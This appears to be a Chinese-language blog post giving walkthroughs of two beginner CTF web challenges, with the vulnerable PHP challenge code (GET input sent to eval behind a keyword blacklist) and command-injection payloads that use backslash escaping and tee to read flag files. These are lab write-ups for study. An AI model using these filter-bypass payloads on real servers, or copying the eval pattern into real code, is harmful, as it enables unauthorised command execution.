@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>web复现2 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="[SWPUCTF 2021 新生赛]finalrce 先进行代码审计，可以看出需要利用get传入一个参数，并且利用if和preg_match（）函数过滤了一系列的字符串 在这里深入的再次介绍exec（）函数 12exec(string $command, array &amp;$output &#x3D; null, int &amp;$result_code &#x3D; null): string|false">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web复现2">
+<meta property="og:url" content="http://example.com/2025/03/16/web%E5%A4%8D%E7%8E%B02/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="[SWPUCTF 2021 新生赛]finalrce 先进行代码审计，可以看出需要利用get传入一个参数，并且利用if和preg_match（）函数过滤了一系列的字符串 在这里深入的再次介绍exec（）函数 12exec(string $command, array &amp;$output &#x3D; null, int &amp;$result_code &#x3D; null): string|false">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/A-gi-art/picture2/%25E5%25B1%258F%25E5%25B9%2595%25E6%2588%25AA%25E5%259B%25BE%25202025-03-16%2520101935.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/A-gi-art/picture2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20104023.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/A-gi-art/picture2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20104054.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/A-gi-art/picture2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20104127.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/A-gi-art/picture2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20104152.png">
+<meta property="article:published_time" content="2025-03-16T02:20:44.000Z">
+<meta property="article:modified_time" content="2025-03-16T03:42:16.853Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/A-gi-art/picture2/%25E5%25B1%258F%25E5%25B9%2595%25E6%2588%25AA%25E5%259B%25BE%25202025-03-16%2520101935.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-web复现2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/03/16/web%E5%A4%8D%E7%8E%B02/" class="article-date">
+  <time class="dt-published" datetime="2025-03-16T02:20:44.000Z" itemprop="datePublished">2025-03-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      web复现2
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="SWPUCTF-2021-新生赛-finalrce"><a href="#SWPUCTF-2021-新生赛-finalrce" class="headerlink" title="[SWPUCTF 2021 新生赛]finalrce"></a>[SWPUCTF 2021 新生赛]finalrce</h1><p><img src="https://cdn.jsdelivr.net/gh/A-gi-art/picture2/%25E5%25B1%258F%25E5%25B9%2595%25E6%2588%25AA%25E5%259B%25BE%25202025-03-16%2520101935.png"></p>
+<p>先进行代码审计，可以看出需要利用get传入一个参数，并且利用if和preg_match（）函数过滤了一系列的字符串</p>
+<p>在这里深入的再次介绍exec（）函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">array</span> &amp;<span class="variable">$output</span> = <span class="literal">null</span>, <span class="keyword">int</span> &amp;<span class="variable">$result_code</span> = <span class="literal">null</span>): <span class="keyword">string</span>|<span class="literal">false</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>exec（）执行command参数所指定的命令，如果提供了output参数，会将命令执行的输出填充此数组，每行输出填充数组中的一个元素。如果同时提供output和result_code参数，命令执行后返回 的结果会被写到result_code ,返回命令执行结果的最后一行内容</p>
+<p>所以这里直接执行命令是没有回显的，这里需要用到一个tee命令</p>
+<p>tee命令会读取标准输入数据，并将其内容输出成文件。</p>
+<p>基本的结构为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command |tee file.txt</span><br></pre></td></tr></table></figure>
+
+<p>|命令连接符，前语句假直接报错，后面不执行。反之，前语句真，后面执行。</p>
+<p>还需要绕过ls</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=l\s / |tee 1.txt</span><br></pre></td></tr></table></figure>
+
+<p>这里的\转义字符是用于在外壳程序中转移字符，使控制字符成为字面量，而失去其在外壳程序中控制符的含义</p>
+<p><img src="https://cdn.jsdelivr.net/gh/A-gi-art/picture2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20104023.png"></p>
+<p>然后去访问&#x2F;1.txt</p>
+<p><img src="https://cdn.jsdelivr.net/gh/A-gi-art/picture2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20104054.png"></p>
+<p>看到文件，且没有过滤tac，直接去读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=tac /flllll\aaaaaaggggggg |tee 2.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/A-gi-art/picture2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20104127.png"></p>
+<p>访问2.txt</p>
+<p><img src="https://cdn.jsdelivr.net/gh/A-gi-art/picture2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20104152.png"></p>
+<p>得到了flag</p>
+<h1 id="UUCTF-2022-新生赛-ez-rce"><a href="#UUCTF-2022-新生赛-ez-rce" class="headerlink" title="[UUCTF 2022 新生赛]ez_rce"></a>[UUCTF 2022 新生赛]ez_rce</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">## 放弃把，小伙子，你真的不会RCE,何必在此纠结呢？？？？？？？？？？？？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;看看你输入的参数！！！不叫样子！！&#x27;</span>;<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;你想干什么？？？？？？？？？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;居然都不输入参数，可恶!!!!!!!!!&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>首先进行代码审计，首先可以看见过滤了一大堆符号，然后看见了eval（）函数</p>
+<p>构造payload：&#x2F;?code&#x3D;printf(<code>l\s /</code>);</p>
+<p>然后会看到fffffffffflagafag，然后获取文件的内容</p>
+<p>因为过滤了cat和tac，因此再次使用\字符</p>
+<p>payload：&#x2F;?code&#x3D;printf(<code>c\at /fffffffffflagafag</code>);</p>
+<p>得到flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/03/16/web%E5%A4%8D%E7%8E%B02/" data-id="cm8b3btu40000g0vqhdwpcm1t" data-title="web复现2" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2025/03/15/web%E5%A4%8D%E7%8E%B01/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/03/">March 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/03/16/web%E5%A4%8D%E7%8E%B02/">web复现2</a>
+          </li>
+        
+          <li>
+            <a href="/2025/03/15/web%E5%A4%8D%E7%8E%B01/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/12/26/%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/12/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/12/22/%E6%96%B0%E7%94%9F%E8%B5%9Bwp/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
